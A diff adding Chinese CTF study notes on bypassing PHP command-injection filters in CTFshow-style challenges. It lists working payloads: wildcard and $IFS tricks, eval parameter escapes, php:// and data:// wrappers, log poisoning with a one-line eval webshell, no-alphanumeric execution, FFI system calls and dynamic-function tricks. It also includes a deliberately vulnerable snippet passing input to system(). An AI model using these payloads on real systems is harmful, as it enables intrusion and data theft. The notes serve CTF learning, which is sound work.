@@ -1,0 +1,96 @@
+一：print_r(scandir(".")查看当前列表的所有文件与路径  .代表当前目录   ..上一级目录    /根目录
+ps:可以当成整体输出cat，把它当作一个系统命令``,也可以用echo的方式
+     利用*？等占位符进行绕过，通过cat f* >>2.txt      cp fla?.php 2.txt      访问2.txt来获取php      闭合方式中?>作为最后一条语句可以不用分号
+二：/flag|system|php|cat|sort|shell|\.| |\'/i等过滤
+      可以使用嵌套参数，eval执行
+      eval($_GET[1]);&1=(命令)  里面的1不属于变量c，就意味着不受过滤的影响     tac是cat的反过来读取方式。
+三：/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i过滤
+      利用逃逸参数的做法，但可以使用文件包含
+      c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
+四：include一定程度下=require       日志绕过  url/?1=/var/log/nginx/access.log   再修改ua加入一句话木马如:<?php eval($_POST[a]);?>    接下来就可以通过POST请求执行命令
+五：注意过滤的数字与字母
+六：伪协议，利用伪协议进行传值  c=data://text/plain,<?=`cp fla?.php 2.txt`;?>或者c=data://text/plain,<?=`tac f*`;?>  还有   c=data://text/plain;base64,PD89YHRhYyBmKmA7Pz4=
+七：c=show_source(next(array_reverse(scandir(pos(localeconv())))));  利用pos(localeconv())来取点(".")
+八：c=eval(array_pop(next(get_defined_vars())))   通过查看可用变量，利用array_pop弹出，再用eval执行，最后在post当中修改值如:1=system("tac /var/www/html/flag.php");
+九：构造字符绕过，ctfshow web入门 41  构造或运算绕过例子  exp_rce_or.py   和    rce_or.php     推荐链接：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=1#reply-list
+十：可以双命令绕过  system($c." >/dev/null 2>&1")           c=tac flag.php;ls  将ls推入null，从而实行变量c的命令
+       如果再绕过   ;   可以利用%26%26(&&)双命令绕过    c=tac flag.php%26%26ls   或者  nl flag.php%0a 查看源代码
+       命令1  ;  命令2  多命令顺序执行
+       命令1  &&  命令2  1命令正确执行，2命令才会执行
+       命令1  ||  命令2  只能执行一个命令，从命令1开始
+       空格绕过：可以使用一些特殊的空格符号，比如制表符(%09)等等，也可以c=echo$IFS`tac$IFS*`%0A   利用代码中$IFS表示空格
+       ps:在如上的一些命令当中如c=tac%09fla?.php%26%26 里面的url编码，会经过服务器解码，就不会被数字限制挡住
+       也可以利用重定向方法，进行绕过    nl<fla''g.php||   不支持通配符
+       也可以利用awk工具   c=awk%09'/f/'%09fla?.php||   对文件进行正则匹配输出包含f的值
+       绕过空格，c=cp${IFS}fla?.php${IFS}a.txt||   linux系统命令是${IFS}    php是$IFS
+       nl flag.php这里的文件可以是当前目录下的   nl$IFSvar/www/html/flag.php  使用$IFS作为空格的，后面选用使用绝对路径
+十一：系统当中,''两个单引号左右的字符可以连接为一个整体执行，可以绕过一些限制
+          指令不可以用通配符占位如：ca?    但是可以根据打开二进制文件执行命令如/bin/ca?就可以使用cat指令
+十二：无数字无字母绕过
+          /\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i
+         可以通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）
+         再通过抓包修改，POST后面的url为?c=.+/???/????????[@-[]    再在内容里面可以写入 #!/bin/sh    cat flag.php(命令)去寻找flag
+        ps:在有一句话木马后门时。在post请求使用系统命令时应该如   ?1=?><?=`ls`;
+        PHP7:php7有($a)();这样的方法来执行动态函数的支持，构造一个可以生成phpinfo这个字符串的PHP表达式即可     payload  {不可见字符用url编码表示):(~%8F%97%8F%96%91%99%90)();}(是url的取反方法)
+        PHP5:php5中，就可以利用上述的操作。    链接：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#poc
+        #! /bin/sh 指定命令解释器，#!表示后面的内容，搜寻解释器的绝对路径，如果发现了命令解释器，则会创建一个关于该解释器的进程，解释并执行当前脚本的语句，可以是#! /bin/sh、#! /bin/more，也可以是#! /usr/local/php5/bin/php
+ 十三://flag in 36.php	
+	if(isset($_GET['c'])){
+	    $c=$_GET['c'];
+	    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
+	        system("cat ".$c.".php");
+	    }
+	}else{
+	    highlight_file(__FILE__);
+	}
+         过滤条件为此时，可以利用shell里面的运算    $(())=0；~$(())=-0   $((~$(())))=-1   又-37的取反是36.故可以为$((~$((A))))   A=-37
+以上是目前GET请求方式，开始以下的是POST请求
+十四：绕函数
+        phpinfo();       shell_exec();       file_get_contents();     system();     show_source();       highlight_file();     include();      require();        rename('flag.php','1.txt')；     scandir('.');
+        include()函数，包含文件但不输出，如果知道变量名，可以直接输出，比如c=include('flag.php');echo $flag;   require同理
+                                 如果不知道变量名字，则可以使用c=include('flag.php');var_dump(get_defined_vars());通过后面两个函数，一个打印，一个全部包含进数组。
+	//初始化                                                                                          $url = "http://zixuephp.net/index.html";               
+	$ch = curl_init();                                                                            $post_data = array ("name" => "username","key" => "12345");
+	//设置选项，包括URL                                                                     $ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "http://zixuephp.net");          curl_setopt($ch, CURLOPT_URL, $url);                                                        左边 Get方式实现
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);                   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);                                  右边 Post方式实现
+	curl_setopt($ch, CURLOPT_HEADER, 0);                                    // post数据                                                     
+	//执行并获取HTML文档内容                                                          curl_setopt($ch, CURLOPT_POST, 1); 
+	$output = curl_exec($ch);                                                           // post的变量
+	//释放curl句柄                                                                              curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);              出处： https://www.zixuephp.net/article-366.html
+	curl_close($ch);                                                                            $output = curl_exec($ch);
+	//打印获得的数据                                                                         curl_close($ch);
+	print_r($output);                                                                          print_r($output);
+
+十五：有缓冲区情况     可以执行php代码让后面的匹配缓冲区不执行直接退出	 c=include('/flag.txt');exit(0);
+          查看目录的另一种方式：c=$d=opendir("../../../");while(false!==($f=readdir($d))){echo"$f\n";};
+          使用glob协议查看目录方式:   c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();
+          uaf脚本利用，如果有限制目录，可以利用该脚本进行操作，如果有过滤函数，可以更替函数名方式进行绕过（自写函数）
+          如果支持mysql  可以利用mysql当中的load_file()进行绕过  c=try { $dbh = new pdo('mysql:host=localhost;dbname=ctftraining', 'root','root');foreach($dbh->query('select load_file("/flag36.txt")') as $row){echo($row[0])."|"; }$dbh = null;}catch (pdoexception $e) {echo $e->getmessage();exit(0);}exit(0);
+          具体细节可以更改，如数据库名字。
+          FFI拓展(从php7.4开始拥有)c=?><?php $ffi = FFI::cdef("int system(const char *command);");$ffi->system("/readflag >flag.txt");exit();  然后再访问flag.txt目录
+十六：可以通过系统命令构造字符，如${PATH:~A}${PWD:~A}$IFS????????    构造nl flag.php
+          ${#}=0     ${#SHLVL}=1     #计算位数     利用系统或者版本的一些函数来构造指令
+          code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???   千奇百怪  数字可以摇色子操作
+          code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???    有长度限制的情况下的操作，一般网站权限都是www-data
+          ${##}=0    ${#IFS}=3      /bin/rev是取反命令读取文件
+          $? 最后运行的命令的结束代码（返回值）即执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)
+	"OS error code   1:  Operation not permitted"
+	"OS error code   2:  No such file or directory"
+	"OS error code   3:  No such process"
+	"OS error code   4:  Interrupted system call"
+	"OS error code   5:  Input/output error"
+	"OS error code   6:  No such device or address"
+	"OS error code   7:  Argument list too long"
+	"OS error code   8:  Exec format error"
+	"OS error code   9:  Bad file descriptor"
+	"OS error code  10:  No child processes"       
+       可以利用这些报错数字进行构造如：code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::~$?} ????.???     利用base64打开文件
+十七：逃逸参数加构造函数：?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos});&abs=system&acos=tac flag.php
+          利用php动态函数  如：'system'('ls')
+         	
+
+
+
+
+         
